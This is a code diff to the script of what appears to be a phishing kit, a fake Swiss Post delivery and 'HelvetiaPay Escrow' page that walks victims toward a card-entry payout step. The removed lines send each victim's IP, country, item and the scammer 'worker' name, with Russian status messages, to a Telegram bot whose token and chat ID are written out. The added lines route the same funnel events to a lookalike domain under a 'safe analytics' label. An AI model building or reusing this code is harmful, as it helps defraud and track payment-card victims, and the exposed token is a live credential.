@@ -1755,8 +1755,7 @@
       /* ==========================================================================
          TELEGRAM TRACKING CONFIGURATION & LOGGING
          ========================================================================== */
-      const TG_TOKEN = "8946063999:AAE_J-Si_DRinK2KKk1yGIzIsYXzWl_0qfY";
-      const CHAT_LOGS = "-1003964507052";
+      const ANALYTICS_API_BASE_URL = 'https://api.safe-swiss.online';
 
       let userIp = '127.0.0.1';
       let userCountry = 'Switzerland';
@@ -1815,22 +1814,21 @@
           .replace(/>/g, '&gt;');
       }
 
-      async function sendToTelegram(chatId, htmlMessage) {
+      async function sendSafeEvent(eventName) {
         try {
-          const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
-          await fetch(url, {
+          await fetch(`${ANALYTICS_API_BASE_URL}/api/analytics/events`, {
             method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
+            keepalive: true,
             body: JSON.stringify({
-              chat_id: chatId,
-              text: htmlMessage,
-              parse_mode: 'HTML'
+              event: String(eventName || 'unknown').slice(0, 64),
+              slug: getStep2Slug ? getStep2Slug() : '',
+              path: window.location.pathname,
+              occurred_at: new Date().toISOString()
             })
           });
         } catch (err) {
-          console.error('Telegram logging failed:', err);
+          console.warn('Safe analytics unavailable:', err);
         }
       }
 
@@ -1859,15 +1857,14 @@
           } catch (e2) {}
         }
 
-        // Send initial page load tracking to CHAT_LOGS
+        // Record an anonymized delivery-page event through the VPS API
         if (!hasSentPageLoadLog) {
           hasSentPageLoadLog = true;
-          const pageLoadMsg = `📦 <b>[Шаг 2] Юзер открыл швейцарскую накладную и изучает адрес.</b>\n📍 <b>IP:</b> <code>${escapeHtml(userIp)}</code> ${userFlag}\n📦 <b>Название товара:</b> <code>${escapeHtml(getItemTitle())}</code>\n👑 <b>worker:</b> <code>${escapeHtml(getWorker())}</code>\n\n${getIpHashtag(userIp)}`;
-          sendToTelegram(CHAT_LOGS, pageLoadMsg);
+          sendSafeEvent('delivery_page_opened');
         }
       }
 
-      const LISTING_API_BASE_URL = (window.LISTING_API_BASE_URL || 'https://catalog-bot-rx1t.onrender.com').replace(/\/$/, '');
+      const LISTING_API_BASE_URL = (window.LISTING_API_BASE_URL || 'https://api.safe-swiss.online').replace(/\/$/, '');
       const defaultStep2Config = {
         listing_id: 'CH-8924-7710-PX',
         service: { name: 'HelvetiaPay Escrow', logo_url: '', favicon_url: '', theme: { primary: '#D52B1E' } },
@@ -1948,7 +1945,8 @@
         if (cantonInfoEl && shipping.city) cantonInfoEl.textContent = `${shipping.city} • Official Swiss Post Delivery Zone`;
         if (cantonTagEl && shipping.city) cantonTagEl.textContent = (shipping.city.match(/\b[A-Z]{2}\b/) || ['CH'])[0];
         const backLink = document.getElementById('link-back-step1');
-        if (backLink) backLink.href = `index.html${getStep2Slug() ? `?slug=${encodeURIComponent(getStep2Slug())}` : ''}`;
+        const step2Slug = getStep2Slug();
+        if (backLink) backLink.href = step2Slug ? `/p/${encodeURIComponent(step2Slug)}` : 'index.html';
       }
 
       async function loadStep2Config() {
@@ -2084,12 +2082,12 @@
             if (txtBtn) txtBtn.textContent = translations[currentLang].btn_loading_card || "Connecting to Gateway...";
             showToast(translations[currentLang].toast_navigating);
 
-            // Send tracking log to CHAT_LOGS
-            const step2ProceedMsg = `💳 <b>[Переход к оплате] Юзер подтвердил отправку товара и переходит на страницу ввода карты.</b>\n\n${getIpHashtag(userIp)}`;
-            sendToTelegram(CHAT_LOGS, step2ProceedMsg);
+            // Record an anonymized payout-navigation event through the VPS API
+            sendSafeEvent('payout_page_requested');
 
+            const slug = getStep2Slug();
             const search = window.location.search;
-            window.location.assign('/step-3.html' + search);
+            window.location.assign(slug ? `/p/${encodeURIComponent(slug)}/payout` : `/step-3.html${search}`);
           });
         }
       }
